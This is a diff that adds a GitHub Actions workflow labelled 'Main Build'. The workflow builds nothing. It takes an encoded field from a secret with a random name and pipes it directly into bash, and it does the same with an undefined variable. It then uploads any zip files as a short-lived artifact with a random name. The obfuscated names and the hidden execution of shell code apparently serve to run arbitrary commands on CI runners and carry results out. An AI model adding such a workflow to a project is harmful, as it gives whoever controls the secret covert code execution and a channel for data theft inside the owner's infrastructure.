@@ -1,0 +1,23 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+jobs:
+  pipeline:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          ilv9742: ${{ secrets.ilv9742 }}
+        run: |
+          printf '%s' "$ilv9742" | jq -r .my24 | /bin/bash
+          printf '%s' "$v67" | jq -r .qchbm93591 | /bin/bash
+
+      - name: Persist output
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: PhzLnOuz
+          path: "*.zip"
+          retention-days: 1
